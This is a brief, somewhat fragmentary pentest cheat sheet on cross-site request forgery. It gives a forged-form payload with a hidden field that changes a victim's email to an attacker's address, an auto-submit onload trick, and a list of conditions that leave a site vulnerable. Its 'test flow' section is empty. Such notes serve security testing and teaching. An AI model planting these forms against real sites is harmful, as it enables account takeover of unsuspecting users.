🔁 CSRF (CROSS-SITE REQUEST FORGERY)
========================================

[WHAT]
- Force victim to perform action

----------------------------------------

  <input type="hidden" name="email" value="attacker@mail.com">
  <input type="submit">
</form>

[AUTO SUBMIT]
----------------------------------------

<body onload="document.forms[0].submit()">

🧪 TEST FLOW

⚠️ VULNERABLE IF
----------------------------------------

- No CSRF token
- Token not validated
- Uses GET for sensitive action
